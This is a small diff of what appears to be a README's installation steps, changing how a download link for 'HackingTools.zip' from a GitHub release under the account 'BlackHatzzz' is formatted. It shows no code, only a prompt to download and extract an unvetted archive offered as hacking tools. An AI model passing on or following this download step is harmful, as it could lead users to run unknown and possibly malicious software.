@@ -60,7 +60,7 @@ Before you begin, ensure you have the following installed:
 
 Download the ZIP file
 
-Click here to download HackingTools.zip [<img src="assets/1751144151272.png" width="40"/>](https://github.com/BlackHatzzz/HackingTools/releases/download/HackingTools/HackingTools.zip)
+[Click here to download HackingTools.zip](https://github.com/BlackHatzzz/HackingTools/releases/download/HackingTools/HackingTools.zip)
 
 Extract the ZIP file
 
